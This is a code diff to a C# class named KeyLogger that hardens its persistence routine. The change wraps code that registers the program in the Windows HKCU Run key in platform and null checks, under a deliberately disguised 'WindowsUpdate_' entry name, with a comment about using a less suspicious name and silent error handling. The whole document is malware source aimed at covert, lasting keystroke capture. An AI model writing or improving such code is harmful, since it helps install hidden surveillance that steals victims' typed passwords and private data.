@@ -160,14 +160,21 @@ class KeyLogger
     {
         try
         {
-            string key = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
-            using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(key, true))
+            // Check if we're on Windows before accessing Registry
+            if (Environment.OSVersion.Platform == PlatformID.Win32NT)
             {
-                string assemblyPath = Process.GetCurrentProcess().MainModule.FileName;
-                string processName = Path.GetFileNameWithoutExtension(assemblyPath);
+                string key = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
+                using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(key, true))
+                {
+                    if (registryKey != null)
+                    {
+                        string assemblyPath = Process.GetCurrentProcess().MainModule.FileName;
+                        string processName = Path.GetFileNameWithoutExtension(assemblyPath);
 
-                // Use a less suspicious name
-                registryKey.SetValue($"WindowsUpdate_{processName}", assemblyPath);
+                        // Use a less suspicious name
+                        registryKey.SetValue($"WindowsUpdate_{processName}", assemblyPath);
+                    }
+                }
             }
         }
         catch { /* Silent failure */ }
